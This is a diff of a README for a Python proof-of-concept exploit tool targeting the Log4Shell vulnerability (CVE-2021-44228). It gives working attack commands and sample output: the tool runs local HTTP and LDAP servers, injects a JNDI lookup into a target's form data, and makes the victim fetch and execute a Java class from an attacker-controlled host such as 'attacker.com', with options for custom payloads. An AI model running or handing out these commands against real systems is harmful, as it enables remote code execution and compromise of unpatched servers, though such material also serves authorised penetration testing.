@@ -2,25 +2,111 @@
 
 An all-in-one pure Python3 PoC for [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228).
 
-## Configure
-
-Replace the global variables at the top of the script to your configuration. 
-
-## Run
-
-All you need is to run with any `python3` install:
-
-```
-python3 ./log4rce.py
-```
-
-## Java
-
-If you want to run your own Java script, do the following (`./java/Exploit.java` as example):
+## Sample
 
 ```bash
-javac ./java/Exploit.java
-python3 -c 'print(open("./java/Exploit.class", "rb").read())'
+> python3 log4rce.py --target "linux" --payload "PAYLOAD" http --url "http://localhost:8080/" --data "address=###"
 ```
 
-Copy the output of the previous in the `JAVA_CLASSES` dict. It can be select through the `TARGET` global variable.
+```
+INFO:root:HTTP -> Running on local port 1337
+INFO:root:Target Class -> http://127.0.0.1:1337/LinuxExploit.class
+INFO:root:LDAP -> Running on local port 1387
+INFO:root:HTTP -> Sending payload to http://localhost:8080/
+127.0.0.1 - - [12/Dec/2021 20:59:55] "GET /LinuxExploit.class HTTP/1.1" 200 -
+INFO:root:Done!
+```
+
+## Usage
+
+This is a CLI tool. All options can be found in the help menu:
+
+```
+python3 log4rce.py --help
+```
+
+The list is pretty extensive, therefore the following will give you a summary of the functionality.
+
+### Attack Modes
+
+The tool allows you to use a few attack modes. These attacks are extensions of the `Log4RCE` class.
+
+#### HTTP
+
+You can perform an automatic HTTP post request using the following:
+
+```
+python3 log4rce.py http --url "http://www.vuln.com:1234/" --data "vuln_param=###"
+```
+
+The previous will inject the JNDI tag into the `###` in the form data.
+
+#### Manual
+
+If you cannot use any of the previous, use this mode to dump the JDNI tag:
+
+```bash
+python3 log4rce.py manual
+```
+
+### Network Settings
+
+The tool allows extensive customization for most network configuration. All the internal servers can be modified to point to different locations according the the remote settings.
+
+#### HTTP Server
+
+You can configure the HTTP server using the following parameters:
+
+```
+python3 log4rce.py --http_port 1234 --http_rport 12345 --http_host "attacker.com"
+```
+
+```
+http_port: The local port to run the server on.
+http_rport: The port that a remote machine accesses.
+http_host: The host name/IP a remote machine accesses. 
+```
+
+#### LDAP Server
+
+You can configure the LDAP server using the following parameters:
+
+```
+python3 log4rce.py --ldap_port 1234 --ldap_rport 12345 --ldap_host "attacker.com"
+```
+
+```
+ldap_port: The local port to run the server on.
+ldap_rport: The port that a remote machine accesses.
+ldap_host: The host name/IP a remote machine accesses. 
+```
+
+### Customization
+
+The tool allows can handle some customization. The following lists some functionality you may be interested in.
+
+### Injecting Payload
+
+You can inject a payload into the Java class using:
+
+```bash
+python3 log4rce.py --payload "PAYLOAD"
+```
+
+The payload will be injected into `"###"` strings.
+
+### Custom Java Payload
+
+You can build your own Java class using the following. 
+
+```bash
+javac /path/to/Exploit.java
+```
+
+The resulting `.class` can be run using:
+
+```bash
+python3 log4rce.py --java_class "/path/to/Exploit.class" ...
+```
+
+Note: You can add a string `"###"` to allow payload injection.
